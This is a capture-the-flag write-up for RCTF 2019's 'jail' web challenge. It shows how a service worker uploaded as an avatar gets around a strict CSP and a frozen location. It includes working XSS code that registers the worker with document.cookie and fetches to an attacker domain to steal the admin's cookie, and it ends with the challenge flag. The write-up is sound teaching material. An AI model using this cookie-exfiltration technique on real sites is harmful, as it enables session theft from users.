# jail

First hint says `Some HTML5 Web APIs maybe useful: https://developer.mozilla.org/zh-CN/docs/Web/API` which makes it clear that this is some sort of XSS/Content injection challenge.
When we sign up on the website and play with it for a while we can notice two additional hints in the cookies.
```
flag1_is_in_cookie
meta_refresh_is_banned_in_server
```

Website allows us to do three useful things:
* add new messages and view them in separate tab
* change avatar
* send feedback which results in admin viewing one of our posts

When we create any post and view it, we can see that server prepends the following code to it:
```html
<script>
window.addEventListener("beforeunload", function (event) {
  event.returnValue = "Are you sure want to exit?"
  return "Are you sure want to exit?"
})
Object.freeze(document.location) </script>
```

Another important thing is CSP header:
```
sandbox allow-scripts allow-same-origin; base-uri 'none';default-src 'self';script-src 'unsafe-inline' 'self';connect-src 'none';object-src 'none';frame-src 'none';font-src data: 'self';style-src 'unsafe-inline' 'self';
```

Basically, we can inject any script, but it must be loaded from the same domain (or be inline). Unfortunately we can't change client location, because `document.location` is frozen.
We can't also load any external images, fonts, styles etc. We can't even send form to external server. But we can register service workers from the same domain!

And here `change avatar` functionality comes into play. Server allows us to upload any file as an avatar and keeps original extension! (except for .php).
We can upload service worker as an avatar and register it in our message.

avatar.js:
```javascript
self.addEventListener('install', function(e) {
	fetch("https://[YOURDOMAIN]/"+self.location.search)
});
```

message:
```
<script>navigator.serviceWorker.register("https://jail.2019.rctf.rois.io/uploads/[YOUR_AVATAR_FILE].js?"+document.cookie);</script>
```

Now we can use `feedback` functionality and ask admin to visit our post. After several seconds we can see the flag in our server logs.

Flag is `RCTF{welc0me_t0_the_chaos_w0r1d}`